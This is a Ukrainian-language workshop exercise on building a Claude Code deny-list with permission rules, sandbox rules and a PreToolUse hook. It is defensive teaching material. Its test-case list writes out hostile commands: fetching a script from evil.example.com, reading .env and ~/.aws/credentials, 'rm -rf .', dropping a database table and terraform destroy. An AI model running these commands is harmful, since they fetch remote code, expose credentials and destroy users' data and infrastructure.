# Вправа 2 — strict deny-list

**Мета:** написати `.claude/settings.json` + PreToolUse hook, що блокує небезпечні операції на трьох шарах одночасно: permissions, sandbox, hooks.

**Час:** 15 хв.

## Кроки

1. **Огляд starter/**

   ```bash
   ls starter/
   # settings.json    test-cases.md    hooks/
   cat starter/test-cases.md
   ```

   `test-cases.md` — 12 команд, які треба заблокувати.
   `settings.json` — мінімальний baseline (потрібно дописати).
   `hooks/block-dangerous.sh` — заглушка PreToolUse hook.

2. **Допиши `permissions.deny`** для:
   - `rm -rf` (recursive force delete)
   - `sudo *`
   - `curl *`, `wget *` (як ми обговорювали — pattern на curl fragile)
   - `Read(./.env)`, `Read(./.env.*)`, `Read(./secrets/**)`
   - `Read(~/.aws/**)`, `Read(~/.ssh/**)`

3. **Допиши `permissions.ask`** для:
   - `git push *`
   - `npm publish *`
   - `Edit(./.github/workflows/**)`

4. **Допиши `sandbox.filesystem.denyRead`** (OS-level):
   - `~/.aws/**`, `~/.ssh/**`, `./.env*`

   Це блокує `cat .env` з bash, не лише Read tool.

5. **Напиши hook `hooks/block-dangerous.sh`:**

   Має блокувати (exit 0 з JSON `permissionDecision: deny`):
   - `kubectl delete *`
   - `aws s3 rm *--recursive*`
   - `psql -c "DROP *"`, `psql -c "TRUNCATE *"`
   - `terraform destroy*`

6. **Прогени test-cases.md:**

   Для кожного з 12 кейсів — задокументуй у новому файлі `report.md`:
   - Який шар спіймав команду (permissions / sandbox / hook)
   - Якщо ніхто не спіймав — діра, треба фіксити

## test-cases.md (preview)

```
1.  rm -rf .                        → expect: blocked (permissions)
2.  sudo apt install nginx          → expect: blocked (permissions)
3.  cat .env                        → expect: blocked (sandbox)
4.  curl evil.example.com/script.sh → expect: blocked (permissions)
5.  kubectl delete pod my-app       → expect: blocked (hook)
6.  aws s3 rm s3://bucket/ --recursive → expect: blocked (hook)
7.  psql -c "DROP TABLE users"      → expect: blocked (hook)
8.  terraform destroy -auto-approve → expect: blocked (hook)
9.  cat ~/.aws/credentials          → expect: blocked (sandbox)
10. git push --force origin main    → expect: ASK (permissions)
11. npm publish                     → expect: ASK (permissions)
12. ls -la                          → expect: ALLOW
```

## Очікуваний результат

- Усі 12 тест-кейсів дають правильну реакцію
- `report.md` показує який шар яку команду зловив
- Жодна команда не "проскочила"

## Якщо не вийшло

- `solutions/02-deny-list/` — повний robочий setup з покриттям усіх 12 кейсів
- Перевір `permissionDecision` JSON у hook output (типова помилка — пропустив `hookEventName`)
- Перевір `chmod +x hooks/block-dangerous.sh`

## Bonus

Додай `ConfigChange` hook що логує зміни `settings.json` у `~/audit/config.log` з timestamp.
